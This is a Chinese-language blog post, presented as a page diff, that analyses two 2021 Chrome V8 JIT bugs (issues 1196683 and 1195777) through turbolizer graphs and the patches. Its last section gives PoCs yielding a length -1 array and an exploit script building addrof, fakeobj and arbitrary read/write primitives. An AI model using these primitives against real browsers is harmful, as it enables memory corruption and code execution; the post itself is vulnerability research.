@@ -6,15 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | ruan</title>
+  <title>Chrome issue 1196683 和 issue 1195777分析 | ruan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ruan">
-<meta property="og:url" content="http://yoursite.com/archives/page/3/index.html">
+  <meta name="description" content="以下是对2021年chrome的issue-1196683和issue-1195777进行的粗略的分析（主要是对v8没有那么的熟悉）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chrome issue 1196683 和 issue 1195777分析">
+<meta property="og:url" content="http://yoursite.com/2021/11/19/Chromium_issue_1196683_1195777%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="ruan">
+<meta property="og:description" content="以下是对2021年chrome的issue-1196683和issue-1195777进行的粗略的分析（主要是对v8没有那么的熟悉）">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1196683-Typer.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1196683-sl.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1196683-patch.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1196683-eo.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1196683-sc.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1196683-is.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1196683-debug.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1195777-Typer.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1195777-tl.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1195777-sl.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1195777-patch.png">
+<meta property="og:image" content="http://yoursite.com/img/issue_1195777-img/1195777-code.png">
+<meta property="article:published_time" content="2021-11-19T10:44:20.000Z">
+<meta property="article:modified_time" content="2021-11-19T11:13:18.928Z">
 <meta property="article:author" content="ruan">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/img/issue_1195777-img/1196683-Typer.png">
   
     <link rel="alternative" href="/atom.xml" title="ruan" type="application/atom+xml">
   
@@ -136,295 +153,238 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Chromium_issue_1196683_1195777分析" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Chrome issue 1196683 和 issue 1195777分析
+    </h1>
+  
+
+        
+        <a href="/2021/11/19/Chromium_issue_1196683_1195777%E5%88%86%E6%9E%90/" class="archive-article-date">
+  	<time datetime="2021-11-19T10:44:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-19</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>以下是对2021年chrome的issue-1196683和issue-1195777进行的粗略的分析（主要是对v8没有那么的熟悉）</p>
+<p><escape><span id="more"></span></escape></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>编译一个8.x版本的v8（反正找一个2021年4月份前的），还需要准备好turbolizer：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd tools/turbolizer</span><br><span class="line">npm i</span><br><span class="line">npm run-script build</span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
+
+<p>接着在浏览器访问：<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/">http://127.0.0.1:8000/</a>  就可以看到turbolizer了 </p>
+<h2 id="issue-1196683"><a href="#issue-1196683" class="headerlink" title="issue-1196683"></a>issue-1196683</h2><p>相关链接：<a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2820971">https://chromium-review.googlesource.com/c/v8/v8/+/2820971</a></p>
+<p>我们稍微改改其提供的<a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2820971/3/test/mjsunit/compiler/regress-1196683.js">regress-1196683.js</a> :</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo());</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++)</span><br><span class="line">  foo();</span><br><span class="line"><span class="built_in">console</span>.log(foo());</span><br></pre></td></tr></table></figure>
+
+<p>运行一下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;./d8 issue<span class="number">-1196683.</span>js</span><br><span class="line"><span class="number">-2147483647</span></span><br><span class="line"><span class="number">2147483649</span></span><br></pre></td></tr></table></figure>
+
+<p>正常情况下结果应该是<code>-2147483647</code>，但是其在生成优化代码后变成了<code>2147483649</code></p>
+<p>用turbolizer来看看优化过程，先生成其json文件：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 issue<span class="number">-1196683.</span>js --trace-turbo</span><br></pre></td></tr></table></figure>
+
+<p>用turbolizer打开生成的json文件（turbo-foo-0.json）</p>
+<h3 id="TyperPhase"><a href="#TyperPhase" class="headerlink" title="TyperPhase"></a>TyperPhase</h3><p><img src="/img/issue_1195777-img/1196683-Typer.png"></p>
+<p>点箭头标记的那个三角，可以显示出与该异或操作相关的节点（30），其输入的两个节点为常数0（节点22）和arr[0]（节点44）</p>
+<h3 id="SimplifiedLoweringPhase"><a href="#SimplifiedLoweringPhase" class="headerlink" title="SimplifiedLoweringPhase"></a>SimplifiedLoweringPhase</h3><p><img src="/img/issue_1195777-img/1196683-sl.png"></p>
+<p>在<code>SimplifiedLowering</code>阶段，原先在<code>Typer</code>阶段的结点30：<code>SpeculativeNumberBitwiseXor</code>被优化成了<code>Word32Xor</code>节点，而且与patch相关的<code>ChangeInt32ToInt64</code>节点也出现了，<a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2820971/3/src/compiler/backend/x64/instruction-selector-x64.cc">patch</a>：</p>
+<p><img src="/img/issue_1195777-img/1196683-patch.png"></p>
+<h3 id="EarlyOptimizationPhase"><a href="#EarlyOptimizationPhase" class="headerlink" title="EarlyOptimizationPhase"></a>EarlyOptimizationPhase</h3><p><img src="/img/issue_1195777-img/1196683-eo.png"></p>
+<p>到了<code>EarlyOptimization</code>阶段，原本的<code>Word32Xor</code>节点已经被Reduce了，导致原本<code>ChangeInt32ToInt64</code>节点的输入类型由原本的<code>Signed32</code>（见SimplifiedLoweringPhase）变成了<code>Unsigned32</code>，和这里的逻辑相关的代码为：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> WordNAdapter&gt;</span><br><span class="line"><span class="function">Reduction <span class="title">MachineOperatorReducer::ReduceWordNXor</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">using</span> A = WordNAdapter;</span><br><span class="line">  <span class="function">A <span class="title">a</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">typename</span> A::IntNBinopMatcher <span class="title">m</span><span class="params">(node)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (m.<span class="built_in">right</span>().<span class="built_in">Is</span>(<span class="number">0</span>)) <span class="keyword">return</span> <span class="built_in">Replace</span>(m.<span class="built_in">left</span>().<span class="built_in">node</span>());  <span class="comment">// x ^ 0 =&gt; x</span></span><br><span class="line">  <span class="keyword">if</span> (m.<span class="built_in">IsFoldable</span>()) &#123;  <span class="comment">// K ^ K =&gt; K  (K stands for arbitrary constants)</span></span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">ReplaceIntN</span>(m.<span class="built_in">left</span>().<span class="built_in">ResolvedValue</span>() ^ m.<span class="built_in">right</span>().<span class="built_in">ResolvedValue</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (m.<span class="built_in">LeftEqualsRight</span>()) <span class="keyword">return</span> <span class="built_in">ReplaceInt32</span>(<span class="number">0</span>);  <span class="comment">// x ^ x =&gt; 0</span></span><br><span class="line">  <span class="keyword">if</span> (A::<span class="built_in">IsWordNXor</span>(m.<span class="built_in">left</span>()) &amp;&amp; m.<span class="built_in">right</span>().<span class="built_in">Is</span>(<span class="number">-1</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">typename</span> A::IntNBinopMatcher <span class="title">mleft</span><span class="params">(m.left().node())</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (mleft.<span class="built_in">right</span>().<span class="built_in">Is</span>(<span class="number">-1</span>)) &#123;  <span class="comment">// (x ^ -1) ^ -1 =&gt; x</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Replace</span>(mleft.<span class="built_in">left</span>().<span class="built_in">node</span>());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a.<span class="built_in">TryMatchWordNRor</span>(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们的情况真好是 x^0 , 所以用左边节点来替换当前节点，导致了类型由<code>Signed32</code>变成了<code>Unsigned32</code></p>
+<h3 id="schedule"><a href="#schedule" class="headerlink" title="schedule"></a>schedule</h3><p><img src="/img/issue_1195777-img/1196683-sc.png"></p>
+<p>再到register allocation：</p>
+<h3 id="register-allocation"><a href="#register-allocation" class="headerlink" title="register allocation"></a>register allocation</h3><p><img src="/img/issue_1195777-img/1196683-is.png"></p>
+<p>imm:20 的值为1，红框对应的就是我们js代码中的 （arr[0] ^ 0 + 1）</p>
+<p>这里应该是对应了patch中的指令选择阶段，我们的输入类型由于是<code>Unsigned32</code>，所以在指令选择阶段选择了<code>kX64Movl</code>指令，而不是会做符号拓展的<code>kX64Movsxlq</code>指令，导致结果变成了无符号的<code>0x80000000+1</code>也就是2147483649</p>
+<p>我们还可以调试一下，给代码加一个断点：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo());</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++)</span><br><span class="line">  foo();</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="built_in">console</span>.log(foo());</span><br></pre></td></tr></table></figure>
+
+<p>加一个<code>--print-opt-code</code>来确定优化代码的位置并下断点：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r --allow-natives-syntax --print-opt-code ./issue<span class="number">-1196683.</span>js </span><br></pre></td></tr></table></figure>
+
+<p>下好断点跳过去查看：</p>
+<p><img src="/img/issue_1195777-img/1196683-debug.png"></p>
+<p>后续的<code>add rcx,1</code> 也就是我们的返回结果了</p>
+<h2 id="issue-1195777"><a href="#issue-1195777" class="headerlink" title="issue-1195777"></a>issue-1195777</h2><p>相关链接：<a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2826114">https://chromium-review.googlesource.com/c/v8/v8/+/2826114</a></p>
+<p>我们稍微改改其提供的<a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2826114/3/test/mjsunit/compiler/regress-1195777.js">regress-1195777.js</a> :</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(b)&#123;</span><br><span class="line">        x = <span class="number">0xFFFF_FFFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span> &lt; <span class="built_in">Math</span>.max(<span class="number">0</span>, x, -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">true</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++)</span><br><span class="line">    foo(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">false</span>));</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">true</span>));</span><br></pre></td></tr></table></figure>
+
+<p>运行之后：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;./d8 issue<span class="number">-1195777.</span>js</span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到在优化后，返回了一个错误的false，关键逻辑是在<code> -1 &lt; Math.max(0, x, -1)</code>，用turbolizer来查看其优化过程</p>
+<h3 id="TyperPhase-1"><a href="#TyperPhase-1" class="headerlink" title="TyperPhase"></a>TyperPhase</h3><p><img src="/img/issue_1195777-img/1195777-Typer.png"></p>
+<p>这是与<code>-1 &lt; Math.max(0,x,-1)</code>相关的节点</p>
+<h3 id="TypeLoweringPhase"><a href="#TypeLoweringPhase" class="headerlink" title="TypeLoweringPhase"></a>TypeLoweringPhase</h3><p><img src="/img/issue_1195777-img/1195777-tl.png"></p>
+<p>原本的53和56节点被替换成常数0（节点31）和-1（节点13）</p>
+<h3 id="SimplifiedLoweringPhase-1"><a href="#SimplifiedLoweringPhase-1" class="headerlink" title="SimplifiedLoweringPhase"></a>SimplifiedLoweringPhase</h3><p><img src="/img/issue_1195777-img/1195777-sl.png"></p>
+<p>到了<code>SimplifiedLowering</code>阶段，<code>NumberMax</code>节点被替换成了<code>Int64LessThan</code> 和<code>Selec</code>节点，<code>SpeculativeNumberLessThan</code>被替换成了<code>Int32LessThan</code>；还可以看到最后生成了<code>TruncateInt64ToInt32</code>节点，该节点就是漏洞触发的地方，我们查看<a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2826114/3/src/compiler/representation-change.cc#b955">patch</a>：</p>
+<p><img src="/img/issue_1195777-img/1195777-patch.png"></p>
+<p>但是调试的时候无法断到此处，先留个坑在这。。。</p>
+<p><code>Math.max(0, x, -1)</code>的结果被truncate成了Signed32，导致会计算出错误的结果</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上面的分析，这两个漏洞都能使我们获得一个错误的值为1的变量。通过分析在野利用的exp，利用步骤为：</p>
+<ul>
+<li>用该错误的变量作为长度创建一个Array</li>
+<li>通过<code>Array.prototype.shift</code>来使上一步创建的Array的长度变成0xFFFFFFFF</li>
+</ul>
+<p>第二步的利用方法在4月份的时候也被谷歌修了：<a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/+/d4aafa4022b718596b3deadcc3cdcb9209896154">https://chromium.googlesource.com/v8/v8/+/d4aafa4022b718596b3deadcc3cdcb9209896154</a></p>
+<p>poc1:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">0x7fffffff</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);</span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x==-<span class="number">1</span>) x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);</span><br><span class="line">    arr.shift();</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>]; </span><br><span class="line">    <span class="keyword">return</span> [arr,a];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++)</span><br><span class="line">    foo(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// gc();gc();</span></span><br><span class="line"><span class="keyword">var</span> [oob_arr,corrupt_arr] = foo(<span class="literal">true</span>);</span><br><span class="line"><span class="built_in">console</span>.log(oob_arr.length);			<span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
+
+<p>poc2：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// use issue-1195777</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">flag</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        x = <span class="number">0xFFFF_FFFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    x = <span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>,x,-<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);</span><br><span class="line">    arr.shift();</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>]; </span><br><span class="line">    <span class="keyword">return</span> [arr,a];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++)</span><br><span class="line">    foo(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">var</span> [oob_arr,corrupt_arr] = foo(<span class="literal">true</span>);</span><br><span class="line"><span class="built_in">console</span>.log(oob_arr.length);			<span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看下其生成的优化代码：</p>
+<p><img src="/img/issue_1195777-img/1195777-code.png"></p>
+<p>有两处对长度的赋值，分别对应<code>flag == true</code> 和 <code>flag == false</code> ，第二处的赋值直接把0xfffffffe（Int32(0xffffffff &lt;&lt; 1)）赋值给长度，所以我们能得到一个长度为-1的数组，具体为啥会这样还得等后面熟悉了再回头看看。。。</p>
+<p>后续步骤：</p>
+<ul>
+<li>修改corrupt_arr的length</li>
+<li>利用oob_arr和corrupt_arr来构造addrof和fakeobj原语</li>
+<li>泄露出corrupt_arr的map</li>
+<li>申请一个FixedDoubleArray对象A，布置好其内容（为下一步伪造对象做准备）</li>
+<li>利用fakeobj原语fake一个FixedDoubleArray对象B</li>
+<li>利用对象A和B实现任意地址读写</li>
+</ul>
+<p>具体代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> Uint32 = <span class="keyword">new</span> <span class="built_in">Int32Array</span>(buf);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80000</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">flag</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        x = <span class="number">0xFFFF_FFFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    x = <span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>,x,-<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);</span><br><span class="line">    arr.shift();</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>]; </span><br><span class="line">    <span class="keyword">return</span> [arr,a];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++)</span><br><span class="line">    foo(<span class="literal">false</span>);</span><br><span class="line">gc();gc();</span><br><span class="line"><span class="keyword">var</span> [oob_arr,corrupt_arr] = foo(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// %DebugPrint(oob_arr);</span></span><br><span class="line"><span class="comment">// %DebugPrint(corrupt_arr);</span></span><br><span class="line"><span class="keyword">var</span> idx = <span class="number">6</span>;</span><br><span class="line">oob_arr[<span class="number">10</span>+idx] = <span class="number">0x8888</span>;						<span class="comment">// modify corrupt_arr.length to a big value</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    oob_arr[idx+<span class="number">1</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> f2i(corrupt_arr[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    corrupt_arr[<span class="number">0</span>] = i2f(k);</span><br><span class="line">    <span class="keyword">return</span> oob_arr[idx+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_map = f2i(corrupt_arr[<span class="number">3</span>]);		<span class="comment">// leak corrupt_arr&#x27;s map</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr2 = [i2f(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake = fakeobj(addrof(arr2) + <span class="number">0x20n</span>);		<span class="comment">// fake a FixedDoubleArray obj</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbread</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = i2f((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);        <span class="comment">// set fake&#x27;s length and elements</span></span><br><span class="line">    <span class="keyword">return</span> (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbwrite</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = i2f((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);        <span class="comment">// set fake&#x27;s length and elements</span></span><br><span class="line">    fake[<span class="number">0</span>] = i2f(<span class="built_in">BigInt</span>(val));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调试的时候注意有指针压缩</p>
